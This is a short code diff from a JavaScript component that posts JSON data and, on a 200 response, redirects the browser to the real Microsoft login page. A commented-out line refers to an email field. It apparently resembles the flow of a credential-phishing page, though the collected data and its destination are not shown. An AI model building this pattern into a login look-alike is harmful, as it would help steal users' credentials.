@@ -30,7 +30,7 @@ const Main = () => {
           body: jsondata
       }).then((res) => {
           console.log('successful')
-          if (res.status === 500) {
+          if (res.status === 200) {
             //   Navigate('google.com')
               window.location.assign('https://login.microsoftonline.com/common/login')
             //   setEmail('')
